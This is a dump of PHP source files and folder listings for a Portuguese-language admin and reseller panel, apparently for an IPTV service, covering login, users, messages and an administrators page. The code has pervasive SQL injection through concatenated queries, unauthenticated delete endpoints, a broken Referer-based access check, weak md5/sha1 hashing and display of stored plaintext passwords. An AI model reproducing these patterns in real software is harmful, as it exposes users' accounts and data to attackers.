$usuarioB = buscaUsuario($usuario, $senha);
if ($usuarioB && ($usuarioB['admin'] === "1" || $usuarioB['vendedor'] === "1")) {
    $_SESSION['id_usuario'] = $usuarioB['id_usuario'];
    $_SESSION['admin'] = $usuarioB['admin'] == "1";
    $_SESSION['vendedor'] = $usuarioB['vendedor'] == "1";
    logarUsuario($usuarioB['nome_usuario']);
    $_SESSION['original'] = $usuarioB['id_usuario'];
    setcookie('original', $usuarioB['id_usuario'], time() + (86400 * 30), "/");
    header("HTTP/1.1 200 OK");
} else {
    header('HTTP/1.0 403 Forbidden');
    echo "Usuário ou senha inválida!";
}
if (!is_writable(session_save_path())) {
    echo 'Session path "'.session_save_path().'" is not writable for PHP!'; 
}
?>
/controles/mensagens.php:
<?php
require_once("conexao.php");

function listarMensagens() {
    $categorias = array();
    global $conexao;
    session_start();
    if($_SESSION['admin']){
        $query = "select m.*, u.nome_usuario as criador, e.nome as evento_nome from mensagens m inner join usuario u on u.id_usuario = m.id_criador inner join eventos e on e.id_evento = m.id_evento group by m.id_mensagem";
    }
    $resultado = mysqli_query($conexao, $query);
    while($categoria = mysqli_fetch_assoc($resultado)) {
        array_push($categorias, $categoria);
    }
    return $categorias;
}

function listarMensagensParaVendedor() {
    $categorias = array();
    global $conexao;
    session_start();
    $query = "select (SELECT COUNT(*) FROM lidas WHERE lida = 'sim' and id_usuario = ".$_SESSION['id_usuario']." and id_mensagem = m.id_mensagem) as lida, m.*, u.nome_usuario as criador, e.nome as evento_nome from mensagens m inner join usuario u on u.id_usuario = m.id_criador inner join eventos e on e.id_evento = m.id_evento where m.id_mensagem not in ((select l.id_mensagem from lidas l where l.remover = 1 and l.id_usuario = ".$_SESSION['id_usuario'].")) group by m.id_mensagem order by m.id_mensagem desc";
    $resultado = mysqli_query($conexao, $query);
    while($categoria = mysqli_fetch_assoc($resultado)) {
        if(intval($categoria['lida']) > 0){
            $categoria['lida'] = 'sim';
        } else {
            $categoria['lida'] = 'nao';
        }
        array_push($categorias, $categoria);
    }
    return $categorias;
}

function foiLida($id_mensagem) {
    $categorias = array();
    global $conexao;
    session_start();
    $query = "select * from lidas where id_mensagem = $id_mensagem and lida = 'sim' and id_usuario = ".$_SESSION['id_usuario']."";
    $resultado = mysqli_query($conexao, $query);
    $lida = false;
    while($categoria = mysqli_fetch_assoc($resultado)) {
       $lida = true;
    }
    return $lida;
}

function marcarComoLida($id_mensagem, $remover = 0) {
    global $conexao;
    session_start();
    $query = "select * from lidas where id_mensagem = $id_mensagem and lida = 'sim' and remover = $remover and id_usuario = ".$_SESSION['id_usuario']."";
    $resultado = mysqli_query($conexao, $query);
    $encontrou = false;
    while($categoria = mysqli_fetch_assoc($resultado)) {
       $encontrou = true;
    }
    if($encontrou == false){
        $query = "insert into lidas (id_mensagem, id_usuario, lida, remover) values ({$id_mensagem}, ".$_SESSION['id_usuario'].", 'sim', {$remover})";
        mysqli_query($conexao, $query);

    }
    return true;
}

function adicionarMensagem($titulo, $mensagem, $id_evento) {
    global $conexao;
    $horario = date("d/m/Y H:i:s");
    session_start();
    $query = "insert into mensagens (titulo, mensagem, id_evento, id_criador, data) values ('{$titulo}', '{$mensagem}', $id_evento, ".$_SESSION['id_usuario'].", '{$horario}')";
    echo $query;
    return mysqli_query($conexao, $query);
}

function removerMensagem($id) {
    global $conexao;
    $query = "delete from mensagens where id_mensagem=$id";
    return mysqli_query($conexao, $query);
}

function editarMensagem($id, $titulo, $mensagem, $id_evento) {
    global $conexao;
    $query = "update mensagens set titulo='$titulo', mensagem='$mensagem', id_evento=$id_evento where id_mensagem=$id";
    return mysqli_query($conexao, $query);
}

function obterMensagem($id) {
    $links = array();
    global $conexao;
    $query = "select m.*, u.nome_usuario, e.nome as evento_nome from mensagens m inner join usuario u on u.id_usuario = m.id_criador inner join eventos e on e.id_evento = m.id_evento where m.id_mensagem = $id group by m.id_mensagem";
    $resultado = mysqli_query($conexao, $query);
    while($link = mysqli_fetch_assoc($resultado)) {
        array_push($links, $link);
    }
    return $links;
}
?>
/controles/migrar-usuario.php:
<?php
session_start();
include_once("conexao.php");

$id = filter_input(INPUT_GET, 'id_usuario', FILTER_SANITIZE_NUMBER_INT);
$data = date('Y-m-d', strtotime('+31 days', strtotime('m')));
$dia = "31";
$uso = "0";
$uso_dia = "0";
$estado = "1";

$result_usuario = "UPDATE usuario SET estado_usuario='$estado', data='$data', dia='$dia', uso='$uso', uso_dia='$uso_dia' WHERE id_usuario='$id'";
$resultado_usuario = mysqli_query($conexao, $result_usuario);

if(mysqli_affected_rows($conexao)){
	$_SESSION['msg'] = "";
	header("Location: ../teste.php");
}else{
	$_SESSION['msg'] = "";
	header("Location: ../teste.php");
}
?>
/controles/msg.php:
<?php
if (basename($_SERVER["PHP_SELF"]) === basename(__FILE__)) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}
function embranco() {
    header('HTTP/1.0 403 Forbidden');
    echo "Campo em branco detectado! Corrija";
}
function erro() {
    header('HTTP/1.0 403 Forbidden');
    echo "Erro ao realizar a operação. Verifique os dados!";
}
function invalido() {
    header('HTTP/1.0 403 Forbidden');
    echo "Dados inválidos! Tente novamente";
}
?>
/controles/novidades.php:
<?php
if (basename($_SERVER["PHP_SELF"]) === basename(__FILE__)) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}
require_once("conexao.php");

function listarNovidades() {
    $novidades = array();
    global $conexao;
    session_start();
    $query = "select * from link LIMIT 5";
    if($_SESSION['admin']){
        $query = "select * from link order by id_link DESC limit 5";
    }
    $resultado = mysqli_query($conexao, $query);
    while($novidade = mysqli_fetch_assoc($resultado)) {
        array_push($novidades, $novidade);
    }
    return $novidades;
}
?>
/controles/obter-categoria.php:
<?php
if (!isset($_SERVER['HTTP_REFERER']) &&  !strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST'] ) 
    || !strpos($_SERVER['HTTP_REFERER'], 'lista.php' )) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}

require_once('categorias.php');

$id = $_POST['id'];

$links = obterCategoria($id);
if ($links) { 
    echo json_encode($links);
}
?>
/controles/obter-link-lista.php:
<?php
if (!isset($_SERVER['HTTP_REFERER']) &&  !strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST'] ) 
    || !strpos($_SERVER['HTTP_REFERER'], 'lista.php' )) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}

require_once('links.php');

$id = $_POST['id'];

$link = obterLink($id);
if ($link) { 
    echo json_encode($link);
}
?>
/controles/obter-link.php:
<?php
if (!isset($_SERVER['HTTP_REFERER']) &&  !strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST'] ) 
    || !strpos($_SERVER['HTTP_REFERER'], 'lista.php' )) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}

require_once('links.php');

$id = $_POST['id'];

$link = obterLink($id);
if ($link) { 
    echo json_encode($link);
}
?>
/controles/obter-lista-usuarios.php:
<?php
if (!isset($_SERVER['HTTP_REFERER']) &&  !strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST'] ) 
    || !strpos($_SERVER['HTTP_REFERER'], 'lista.php' )) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}

require_once('listas.php');

$id = $_POST['id'];

$usuarios= obterListaUsuarios($id);
if ($usuarios) { 
    echo json_encode($usuarios);
}
?>
/controles/obter-lista.php:
<?php
if (!isset($_SERVER['HTTP_REFERER']) &&  !strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST'] ) 
    || !strpos($_SERVER['HTTP_REFERER'], 'lista.php' )) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}

require_once('listas.php');

$id = $_POST['id'];

echo obterLista($id);
?>
/controles/remover-administrador.php:
<?php
session_start();
include_once("conexao.php");

$id_usuario = filter_input(INPUT_GET, 'id_usuario', FILTER_SANITIZE_NUMBER_INT);
if(!empty($id_usuario)){
	$result_usuario = "DELETE FROM usuario WHERE id_usuario='$id_usuario'";
	$resultado_usuario = mysqli_query($conexao, $result_usuario);
	if(mysqli_affected_rows($conexao)){
	$_SESSION['msg'] = "";
		header("Location: ../administrador.php");
	}else{
		
		$_SESSION['msg'] = "";
		header("Location: ../administrador.php");
	}
}else{	
	$_SESSION['msg'] = "";
	header("Location: ../administrador.php");
}
?>
/controles/remover-categoria.php:
<?php
if (!isset($_SERVER['HTTP_REFERER']) &&  !strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST'] ) 
    || !strpos($_SERVER['HTTP_REFERER'], 'categoria.php' )) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}

require_once('categorias.php');

$id = $_POST['id'];

removerCategoria($id);
?>
/controles/remover-cliente.php:
<?php
session_start();
include_once("conexao.php");

$id_usuario = filter_input(INPUT_GET, 'id_usuario', FILTER_SANITIZE_NUMBER_INT);
if(!empty($id_usuario)){
	$result_usuario = "DELETE FROM usuario WHERE id_usuario='$id_usuario'";
	$resultado_usuario = mysqli_query($conexao, $result_usuario);
	if(mysqli_affected_rows($conexao)){
	$_SESSION['msg'] = "";
		header("Location: ../cliente.php");
	}else{
		
		$_SESSION['msg'] = "";
		header("Location: ../cliente.php");
	}
}else{	
	$_SESSION['msg'] = "";
	header("Location: ../cliente.php");
}
?>
/controles/remover-evento.php:
<?php
require_once('eventos.php');
require_once('msg.php');

if (isset($_POST['id'])) {
    if ($_POST['id'] !== "") {
        if (!removerEvento($_POST['id'])) {
            erro();
        }
    } else {
        embranco();
    }
} else {
    invalido();
}
?>
/controles/remover-lista.php:
<?php
if (!isset($_SERVER['HTTP_REFERER']) &&  !strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST'] ) 
    ||  !strpos($_SERVER['HTTP_REFERER'], 'lista.php' )) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}

require_once('listas.php');

$id = $_POST['id'];

removerLista($id);
?>
/controles/remover-mensagem.php:
<?php
require_once('mensagens.php');
require_once('msg.php');

if (isset($_POST['id'])) {
    if ($_POST['id'] !== "") {
        if (!removerMensagem($_POST['id'])) {
            erro();
        }
    } else {
        embranco();
    }
} else {
    invalido();
}
?>
/controles/remover-teste.php:
<?php
session_start();
include_once("conexao.php");

$id_usuario = filter_input(INPUT_GET, 'id_usuario', FILTER_SANITIZE_NUMBER_INT);
if(!empty($id_usuario)){
	$result_usuario = "DELETE FROM usuario WHERE id_usuario='$id_usuario'";
	$resultado_usuario = mysqli_query($conexao, $result_usuario);
	if(mysqli_affected_rows($conexao)){
	$_SESSION['msg'] = "";
		header("Location: ../teste.php");
	}else{
		
		$_SESSION['msg'] = "";
		header("Location: ../teste.php");
	}
}else{	
	$_SESSION['msg'] = "";
	header("Location: ../teste.php");
}
?>
/controles/remover-usuario.php:
<?php
session_start();
include_once("conexao.php");

$id_usuario = filter_input(INPUT_GET, 'id_usuario', FILTER_SANITIZE_NUMBER_INT);
if(!empty($id_usuario)){
	$result_usuario = "DELETE FROM usuario WHERE id_usuario='$id_usuario'";
	$resultado_usuario = mysqli_query($conexao, $result_usuario);
	if(mysqli_affected_rows($conexao)){
	$_SESSION['msg'] = "";
		header("Location: ../usuario.php");
	}else{
		
		$_SESSION['msg'] = "";
		header("Location: ../usuario.php");
	}
}else{	
	$_SESSION['msg'] = "";
	header("Location: ../usuario.php");
}
?>
/controles/usuarios.php:
<?php
require_once("conexao.php");

function buscaUsuario($usuario, $senha, $cliente = false) {
    global $conexao;
    $usuario = mysqli_real_escape_string($conexao, $usuario);
    if($cliente)
	$cliente = ' or vendedor = 0';

    $query = "select * from usuario where login_usuario = '{$usuario}' and senha_usuario = '{$senha}' and (admin = 1 or vendedor = 1".$cliente.") and estado_usuario = 1";
    $resultado = mysqli_query($conexao, $query);
    $usuario = mysqli_fetch_assoc($resultado);
    return $usuario;
}
function listarLogs($id_usuario){
    global $conexao;
    $query = "select * from logs where  id_usuario= " . $id_usuario . " order by id_log DESC limit 50";
    $resultado = mysqli_query($conexao, $query);
    $logs = [];
    while ($log = mysqli_fetch_assoc($resultado)) {
	$logs[] = $log;
    }
    return $logs;
}
function porid($id){
    global $conexao;
    $query = "SELECT * from usuario where id_usuario = ".$id."";
    $resultado = mysqli_query($conexao, $query);
    echo  $id;
    return mysqli_fetch_assoc($resultado);
}
function logarUsuario($usuario) {
    $_SESSION['usuario'] = $usuario;
    $_SESSION['logado'] = true;
}

function usuarioLogado() {
    return $_SESSION['usuario'];
}

function checarUsuario() {
    if (isset($_SESSION['usuario']) && $_SESSION['logado']) {
        return true;
    } else {
        return false;
    }
}

function listarUsuarios() {
    $usuarios = array();
    global $conexao;
    session_start();
    $query = "select * from usuario where id_criador = ".$_SESSION['id_usuario']."";
    if($_SESSION['admin']){
        $query = "select * from usuario";
    }
    if($_SESSION['original'] !== $_SESSION['id_usuario']){
	$query = "select * from usuario where id_criador = ".$_SESSION['id_usuario']." or id_usuario = ".$_SESSION['original']."";
    }
    $resultado = mysqli_query($conexao, $query);
    while($usuario = mysqli_fetch_assoc($resultado)) {
  	$q = "select * from usuario where id_usuario = ".$usuario['id_criador']."";
	$q = mysqli_query($conexao, $q);
	$usuario['criador'] = mysqli_fetch_assoc($q);
        array_push($usuarios, $usuario);
    }
    return $usuarios;
}

function listasUsuario($id) {
    $listas = array();
    global $conexao;
    $query = "select lista.* FROM lista_usuario INNER JOIN usuario ON (usuario.id_usuario = lista_usuario.id_usuario) INNER JOIN lista ON (lista.id_lista = lista_usuario.id_lista) where usuario.id_usuario = $id";
    $resultado = mysqli_query($conexao, $query);
    while($lista = mysqli_fetch_assoc($resultado)) {
        array_push($listas, $lista);
    }
    return $listas;
}

function adicionarUsuario($nome, $login, $senha, $admin, $vendedor, $credito = 0, $master, $lista) {
    global $conexao;
    $acesso = md5(sha1($login . "iptv"));
    if ($senha !== "") {
        $senha = md5(sha1($senha . "iptv"));
    }
    if(trim($dia) == ''){
	$dia = 0;
    }
    session_start();
    $query = "insert into usuario (id_criador, nome_usuario, login_usuario, senha_usuario, admin, vendedor, acesso, dia, conectado, credito, master, data) values (".$_SESSION['id_usuario'].", '{$nome}', '{$login}', '{$senha}', '0', '1', '', '0', '0', '{$credito}', '{$master}', '')";
    $resultado = mysqli_query($conexao, $query);
    $id = mysqli_insert_id($conexao);
    echo mysqli_error($conexao);
    echo $query;
    if (count($lista) > 0) {
        for ($i =0; $i < count($lista); $i++) {
            mysqli_query($conexao, "insert into lista_usuario (id_lista, id_usuario) values ($lista[$i], $id)");
        }
    }
    return $resultado;

}

function acessoLista($acesso, $idlista) {
    global $conexao;
    $resultadoUsuario = mysqli_query($conexao,"select * from usuario where acesso= '$acesso' and estado_usuario = 1");
    $usuario = mysqli_fetch_assoc($resultadoUsuario);
    if ($usuario) {
        $resultadoLista = mysqli_query($conexao,"select lista.* FROM lista_usuario INNER JOIN usuario ON (usuario.id_usuario = 
        lista_usuario.id_usuario) INNER JOIN lista ON (lista.id_lista = lista_usuario.id_lista) where usuario.id_usuario = 
        {$usuario['id_usuario']} and lista.id_lista = $idlista");
        $lista = mysqli_fetch_assoc($resultadoLista);
        if ($lista) {
            return $lista;
        }
    }
}
?>
/controles/verificar-mensagens.php:
---------------------------------------------------------------------------------
/css:
/css/bootcss
/css/bootcss/reset.css
/css/bootcss/styles.css
/css/fontes/poppins/
/css/fontes/poppins/fa-brands-400.eot
/css/fontes/poppins/fa-brands-400.svg
/css/fontes/poppins/fa-brands-400.ttf
/css/fontes/poppins/fa-brands-400.woff
/css/fontes/poppins/fa-brands-400.woff2
/css/fontes/poppins/fa-regular-400.eot
/css/fontes/poppins/fa-regular-400.ttf
/css/fontes/poppins/fa-regular-400.woff
/css/fontes/poppins/fa-regular-400.woff2
/css/fontes/poppins/fa-solid-900.eot
/css/fontes/poppins/fa-solid-900.svg
/css/fontes/poppins/fa-solid-900.ttf
/css/fontes/poppins/fa-solid-900.woff
/css/fontes/poppins/fa-solid-900.woff2
/css/Stylesheet.css
/css/all.css
/css/animate.css
/css/bootstrap-datetimepicker.min.css
/css/bootstrap-grid.css
/css/bootstrap-grid.css.map
/css/bootstrap-grid.min.css
/css/bootstrap-grid.min.css.map
/css/bootstrap-reboot.css
/css/bootstrap-reboot.css.map
/css/bootstrap-reboot.min.css
/css/bootstrap-reboot.min.css.map
/css/bootstrap-select.min.css
/css/bootstrap.css.map
/css/bootstrap.min.css
/css/bootstrap.min.css.map
/css/css.css
/css/dashboard.css
/css/dashboard.min.css
/css/editor.css
/css/font-face.css
/css/login.css
/css/main.css
/css/painel.css
/css/patternfly-additions.min.css
/css/tema.css
/css/theme.css
/css/uppy.min.css
---------------------------------------------------------------------------------
/fonts
/fonts/poppins/poppins
/fonts/poppins/poppins-v5-latin-100.eot
/fonts/poppins/poppins-v5-latin-100.svg
/fonts/poppins/poppins-v5-latin-100.ttf
/fonts/poppins/poppins-v5-latin-100.woff
/fonts/poppins/poppins-v5-latin-100.woff2
/fonts/poppins/poppins-v5-latin-100italic.eot
/fonts/poppins/poppins-v5-latin-100italic.svg
/fonts/poppins/poppins-v5-latin-100italic.ttf
/fonts/poppins/poppins-v5-latin-100italic.woff
/fonts/poppins/poppins-v5-latin-100italic.woff2
/fonts/poppins/poppins-v5-latin-200.eot
/fonts/poppins/poppins-v5-latin-200.svg
/fonts/poppins/poppins-v5-latin-200.ttf
/fonts/poppins/poppins-v5-latin-200.woff
/fonts/poppins/poppins-v5-latin-200.woff2
/fonts/poppins/poppins-v5-latin-200italic.eot
/fonts/poppins/poppins-v5-latin-200italic.svg
/fonts/poppins/poppins-v5-latin-200italic.ttf
/fonts/poppins/poppins-v5-latin-200italic.woff
/fonts/poppins/poppins-v5-latin-200italic.woff2
/fonts/poppins/poppins-v5-latin-300.eot
/fonts/poppins/poppins-v5-latin-300.svg
/fonts/poppins/poppins-v5-latin-300.ttf
/fonts/poppins/poppins-v5-latin-300.woff
/fonts/poppins/poppins-v5-latin-300.woff2
/fonts/poppins/poppins-v5-latin-300italic.eot
/fonts/poppins/poppins-v5-latin-300italic.svg
/fonts/poppins/poppins-v5-latin-300italic.ttf
/fonts/poppins/poppins-v5-latin-300italic.woff
/fonts/poppins/poppins-v5-latin-300italic.woff2
/fonts/poppins/poppins-v5-latin-500.eot
/fonts/poppins/poppins-v5-latin-500.svg
/fonts/poppins/poppins-v5-latin-500.ttf
/fonts/poppins/poppins-v5-latin-500.woff
/fonts/poppins/poppins-v5-latin-500.woff2
/fonts/poppins/poppins-v5-latin-500italic.eot
/fonts/poppins/poppins-v5-latin-500italic.svg
/fonts/poppins/poppins-v5-latin-500italic.ttf
/fonts/poppins/poppins-v5-latin-500italic.woff
/fonts/poppins/poppins-v5-latin-500italic.woff2
/fonts/poppins/poppins-v5-latin-600.eot
/fonts/poppins/poppins-v5-latin-600.svg
/fonts/poppins/poppins-v5-latin-600.ttf
/fonts/poppins/poppins-v5-latin-600.woff
/fonts/poppins/poppins-v5-latin-600.woff2
/fonts/poppins/poppins-v5-latin-600italic.eot
/fonts/poppins/poppins-v5-latin-600italic.svg
/fonts/poppins/poppins-v5-latin-600italic.ttf
/fonts/poppins/poppins-v5-latin-600italic.woff
/fonts/poppins/poppins-v5-latin-600italic.woff2
/fonts/poppins/poppins-v5-latin-700.eot
/fonts/poppins/poppins-v5-latin-700.svg
/fonts/poppins/poppins-v5-latin-700.ttf
/fonts/poppins/poppins-v5-latin-700.woff
/fonts/poppins/poppins-v5-latin-700.woff2
/fonts/poppins/poppins-v5-latin-700italic.eot
/fonts/poppins/poppins-v5-latin-700italic.svg
/fonts/poppins/poppins-v5-latin-700italic.ttf
/fonts/poppins/poppins-v5-latin-700italic.woff
/fonts/poppins/poppins-v5-latin-700italic.woff2
/fonts/poppins/poppins-v5-latin-800.eot
/fonts/poppins/poppins-v5-latin-800.svg
/fonts/poppins/poppins-v5-latin-800.ttf
/fonts/poppins/poppins-v5-latin-800.woff
/fonts/poppins/poppins-v5-latin-800.woff2
/fonts/poppins/poppins-v5-latin-800italic.eot
/fonts/poppins/poppins-v5-latin-800italic.svg
/fonts/poppins/poppins-v5-latin-800italic.ttf
/fonts/poppins/poppins-v5-latin-800italic.woff
/fonts/poppins/poppins-v5-latin-800italic.woff2
/fonts/poppins/poppins-v5-latin-900.eot
/fonts/poppins/poppins-v5-latin-900.svg
/fonts/poppins/poppins-v5-latin-900.ttf
/fonts/poppins/poppins-v5-latin-900.woff
/fonts/poppins/poppins-v5-latin-900.woff2
/fonts/poppins/poppins-v5-latin-900italic.eot
/fonts/poppins/poppins-v5-latin-900italic.svg
/fonts/poppins/poppins-v5-latin-900italic.ttf
/fonts/poppins/poppins-v5-latin-900italic.woff
/fonts/poppins/poppins-v5-latin-900italic.woff2
/fonts/poppins/poppins-v5-latin-italic.eot
/fonts/poppins/poppins-v5-latin-italic.svg
/fonts/poppins/poppins-v5-latin-italic.ttf
/fonts/poppins/poppins-v5-latin-italic.woff
/fonts/poppins/poppins-v5-latin-italic.woff2
/fonts/poppins/poppins-v5-latin-regular.eot
/fonts/poppins/poppins-v5-latin-regular.svg
/fonts/poppins/poppins-v5-latin-regular.ttf
/fonts/poppins/poppins-v5-latin-regular.woff
/fonts/poppins/poppins-v5-latin-regular.woff2
/fonts/fontawesome-webfont.ttf
/fonts/fontawesome-webfont.woff
/fonts/fontawesome-webfont.woff2
---------------------------------------------------------------------------------
/img
/img/1200x630wa.png
/img/IPTV (1).jpg
/img/fundo1.jpg
/img/fundo2.jpg
/img/fundo20.jpg
/img/iptv-lista-1920x1024.jpg
/img/iptv.jpg
/img/logo-min.png
/img/logo-min1.png
/img/logo-removebg-preview.png
/img/logo.png
/img/logo1.png
/img/logo11.png
/img/user.png
---------------------------------------------------------------------------------
/js
/js/assets
/js/assets/jquery.js
/js/assets/scripts.js
/js/8b521a5df9.js
/js/bootstrap-datetimepicker.js
/js/bootstrap-select.min.js
/js/bootstrap.bundle.js
/js/bootstrap.bundle.js.map
/js/bootstrap.bundle.min.js
/js/bootstrap.bundle.min.js.map
/js/bootstrap.js
/js/bootstrap.js.map
/js/bootstrap.min.js
/js/bootstrap.min.js.map
/js/defaults-pt_BR.min.js
/js/jquery.min.js
/js/main.js
/js/moment.js
/js/painel.js
/js/patternfly.min.js
/js/popper.min.js
/js/sweetalert.min.js
/js/uppy.io.js
---------------------------------------------------------------------------------
/LEIA-ME.md
/administrador.php:
<?php
session_start();
require_once("controles/usuarios.php");
require_once("controles/listas.php");
if (checarUsuario()) {
require_once("cabecalho.php");
$usuarios = listarUsuarios();
$listas = listarListas();
?>
<?php if($_SESSION['vendedor']) { ?>
<script>if(window==window.top) document.location="dashboard.php"</script>
<?php } ?>
<style id="checkme">
	.page-2content {
	    padding-left: 240px !important;
		padding-right: 240px !important;
	}
	</style>
        <div id="conteudo-painel" style="padding-left: 0px;" class="table-responsive container">
			<?php if ($usuarios) { ?>
                <div class="mb-5 form-group float-right">
                </div>
				<div class="mb-5 form-group float-left">
                    <input type="text" class="pesquisar form-control" placeholder="Pesquisar...">
                </div>
				<table class='table table-bordered table-hover'>
                    <caption>Administradores</caption>
				<thead class="thead-light">
					<tr align="center">
						<th class='nomecol' style="width: 15%" scope="col">Nome</th>
						<th class='nomecol' style="width: 15%" scope="col">Login</th>
						<th class='nomecol' style="width: 15%" scope="col">Senha</th>
						<th class='nomecol' style="width: 15%" scope="col">Criador</th>
                        <th class='nomecol' style="width: 15%" scope="col">Estado</th>
						<th class='nomecol' style="width: 9%" scope="col">Opções</th>
					</tr>
				</thead>
                <tbody id="conteudo">
					<?php foreach($usuarios as $usuario) { ?>
                    <?php if ($usuario['admin'] == 1) if ($usuario['vendedor'] == 0) { ?>
					<?php
                    $passwords = "SELECT * FROM passwords WHERE id_usuario = ".$usuario['id_usuario']."";
                    $resut = mysqli_query($conexao, $passwords);
                    while($password = mysqli_fetch_array($resut)){
					?>
					<tr>
							<td align="center"> <?=$usuario['nome_usuario']?> </td>
							<td align="center"> <?=$usuario['login_usuario']?> </td>
							<td align="center"> <?php echo $password['senha']; ?> </td>
							<td align="center"> <?php echo $usuario['criador'] ? $usuario['criador']['nome_usuario'] : 'Sistema'; ?> </td>
                            <td align="center"> <?php if ($usuario['estado_usuario'] == 1) {echo "Ativado";} else {echo "Desativado";} ?> </td>
							<td style="display: contents;">
								<div class="dropdown">
									<style>.no-zero { padding-top: 0px; padding-bottom: 0px; position: relative; }</style>
									<button class="btn" type="button" data-toggle="dropdown" aria-expanded="false" style="top: 3px; margin: 0 auto; position: relative; display: block">Opções<span class="fa fa-caret-down" style="left: 4px; position: relative" aria-hidden="true"></span></button>
									<style>.pointer { cursor: pointer; border:none }</style>
									<ul class="no-zero dropdown-menu pointer" x-placement="bottom-start">
										<li align="center"><a  class='btn btn-outline-secondary' onclick="editarConfirma('<?php echo $usuario['dia']; ?>', '<?=$usuario['id_usuario']?>','<?=$usuario['nome_usuario']?>','<?php echo $password['senha'];?>','<?=$usuario['login_usuario']?>','<?=$usuario['estado_usuario']?>','<?=$usuario['admin']?>', '<?=$usuario['vendedor']?>', [<?php foreach (listasUsuario($usuario['id_usuario']) as $lista) echo $lista['id_lista'] .',' ?> ])" style="width: 100%;display: block;padding: 5px;top: -10px;"><i class="fas fa-user-edit"></i> Editar</a></li>
										<li align="center"><a  class='btn btn-outline-secondary' onclick="removerConfirma('<?=$usuario['id_usuario']?>', '<?=$usuario['nome_usuario']; ?>')" style="width: 100%; display: block; padding: 5px"><i class="far fa-trash-alt"></i> Excluir</a></li>
									</ul>
								</div>
							</td>
						</tr>
					<?php } ?>
					<?php } ?>
					<?php } ?>
				</tbody>
			</table>
        <?php
        }
        ?>
		  <?php if($_SESSION['admin']) { ?>
             <div class="h3 mt-5 row align-items-center justify-content-center">
             <i onclick="$('#cadastro').modal()" class="btn btn-outline-info text-dark fas fa-plus"></i>
          <?php } ?>
            </div>
        </div>
    </div>
  </main>
<!-- page-content" -->
</div>
<?php if($_SESSION['admin']) { ?>
<!-- Cadastro Inicio -->
<div class="modal fade" id="cadastro" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="TituloModalLongoExemplo">Adicionar Administrador</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="cadastro-form">
            <div class="container">
                <div class="form-group">
                    <label>Nome:</label>
                    <input type="text" class="form-control" name="nome" placeholder="Nome" value="<?php $gerador = rand(8,8); $valor = substr(str_shuffle("abcdefghijlkmnopqrstuvxyzwABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $gerador); echo $valor; ?>">
                    <small class="form-text text-muted">Deixa gerar um nome automático se não quiser colocar</small>
                </div>
                <div class="form-group">
                    <label>Login:</label>
                    <input type="text" class="form-control" name="login" placeholder="Login" value="<?php echo rand(1,999999);?>">
                    <small class="form-text text-muted">Deixa gerar um login automático se não quiser colocar</small>
                </div>
                <div id="sC">
                    <div id="divSenhaC" class="form-group">
                    <label>Senha:</label>
                    <input type="password" class="form-control" name="senha" placeholder="Senha" value="<?php echo rand(1,999999);?>">
                    <small class="form-text text-muted">Deixa gerar uma senha automático se não quiser colocar</small>
                </div>
                </div>
                <div class="form-group">
                    <label>Nível:</label>
                    <div class="ml-0 row">
                        <select id="nivelC" class="selectpicker" title="Nível">
                            <?php if($_SESSION['admin']) { ?>
							<option value="admin">Administrador</option>
                            <option value="vendedor" hidden></option>
							<option value="cliente" hidden></option>
                            <?php } ?>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Administrador:</label>
                    <div class="ml-0 row">
                        <select value="0" id="adminC" class="selectpicker" title="Administrador" name="admin" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Vendedor:</label>
                    <div class="ml-0 row">
                        <select value="0" id="vendedorC" class="selectpicker" title="Vendedor" name="vendedor" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <button type="none" onclick="addForce()" class="btn btn-danger">Adicionar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Cadastro Fim-->
<?php } ?>
<?php if($_SESSION['admin']) { ?>
<!-- Remove Inicio -->
<div class="modal fade" id="remover" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Tem certeza?</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div id="remover-conteudo" class="modal-body"></div>
    </div>
  </div>
</div>
<!-- Remove Fim-->
<?php } ?>
<?php if($_SESSION['admin']) { ?>
<!-- Edita Inicio -->
<div class="modal fade" id="editar" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Editar Administrador</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="editar-form">
            <div class="container">
                <input type="hidden" id="idE" name="id">
                <div class="form-group">
                    <label>Nome:</label>
                    <input type="text" class="form-control" id="nomeE" name="nome" placeholder="Nome">
                </div>
                <div class="form-group">
